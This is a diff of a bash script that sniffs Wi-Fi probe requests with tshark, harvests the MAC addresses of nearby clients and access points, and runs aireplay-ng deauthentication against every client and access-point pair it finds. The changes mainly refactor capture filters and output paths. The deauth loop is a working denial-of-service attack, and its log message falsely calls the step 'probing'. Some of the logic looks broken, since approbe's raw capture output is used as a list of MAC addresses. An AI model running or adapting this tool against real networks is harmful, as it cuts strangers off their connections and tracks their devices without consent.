@@ -31,7 +31,7 @@ wlan(){
 }
 
 frames(){
-    tshark -n -i "$wifi_interface" "$filter_my_mac" -f "type mgt" -f "not subtype beacon" \
+    tshark -n -i "$wifi_interface" "$filter_my_mac" -f "type mgt" -f "subtype probereq" \
         > mgt.cap 2>tshark.log &
 }
 
@@ -44,39 +44,42 @@ aps(){
     grep -io '[0-9a-f:]\{17\}' beacons.cap | sort -u | sed 's|ff:ff:ff:ff:ff:ff||g' | tee routers.txt
 }
 
-approbe(){
-    unique_macs=$(aps)
-    for mac in $unique_macs; do
-        echo "Probing for beacon information from $mac"
-        output_file=$(echo "$mac" | tr -d ":").apmac
-        tshark -n -i "$wifi_interface" -f "ether host $mac" -f "type mgt" -c 1 \
-            | tee "$output_file"
-    done
-}
-
 macs(){
     grep -io '[0-9a-f:]\{17\}' mgt.cap | sort -u | sed 's|ff:ff:ff:ff:ff:ff||g' | tee macs.txt
 }
 
+approbe(){
+    unique_macs=$(aps)
+    mkdir -p out
+    for mac in $unique_macs; do
+        echo "Probing for beacon information from $mac"
+        output_file=$(echo "$mac" | tr -d ":").apmac
+        tshark -n -i "$wifi_interface" -f "ether host $mac" -f "type mgt" -c 1 \
+            | tee "out/$output_file"
+    done
+}
+
 macprobe(){
     unique_macs=$(macs)
+    mkdir -p out
     for mac in $unique_macs; do
         echo "Probing for beacon information from $mac"
         output_file=$(echo "$mac" | tr -d ":").mac
         tshark -n -i "$wifi_interface" -f "ether host $mac" -f "type mgt" -c 1 \
-            | tee "$output_file"
+            | tee "out/$output_file"
     done
 }
 
 deauth(){
     unique_macs=$(macs)
     ap_mac=$(approbe)
+    mkdir -p out
     for ap in $ap_mac; do
         for mac in $unique_macs; do
             echo "Probing for beacon information from $mac"
             output_file=$(echo "$mac" | tr -d ":").deauth
             sudo aireplay-ng -0 1 -a "$ap" -c "$mac" "$wifi_interface" \
-                | tee "$output_file"
+                | tee "out/$output_file"
         done
     done
 }
